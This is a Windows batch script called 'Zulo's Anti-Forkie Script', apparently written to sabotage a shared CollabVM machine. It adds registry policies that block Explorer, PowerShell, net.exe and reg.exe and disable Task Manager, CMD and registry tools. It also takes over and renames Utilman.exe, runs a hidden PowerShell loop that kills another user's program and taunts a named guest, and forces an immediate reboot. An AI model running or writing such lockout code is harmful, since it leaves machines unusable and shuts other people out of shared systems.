@echo off
:: ===================================================

::                      ZAFS

:: ===================================================
:: btw, open source now
:: ZAFS, Zulo's Anti-Forkie Script
:: btw, if you dont know what is a forkie, a forkie is a user that constantly destroys computernewb.com's CollabVM
echo Executing illegal magic...
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "explorer.exe" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 2 /t REG_SZ /d powershell.exe /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 3 /t REG_SZ /d powershell_ise.exe /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 4 /t REG_SZ /d netplwiz.exe /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 5 /t REG_SZ /d SystemSettings.exe /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 6 /t REG_SZ /d net.exe /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f >nul 2>&1
start /b powershell -nologo -WindowStyle Hidden -command "while($true){$lol = Get-Process comedic -ErrorAction SilentlyContinue;if($lol){$lol | Stop-Process -Force;start mshta \"vbscript:Execute(`\"MsgBox(`\"`\"you won't be running this anymore, guest82430.`\"`\",48,`\"`\":3`\"`\")(window.close)`\")\"};Start-Sleep -m 500}"
start /min cmd /c "takeown /f C:\Windows\system32\Utilman.exe && icacls C:\Windows\system32\Utilman.exe /grant "%username%":M && rename C:\Windows\system32\Utilman.exe ~Utilman.exe"

shutdown -r -t 0
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 9 /t REG_SZ /d reg.exe /f & reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
exit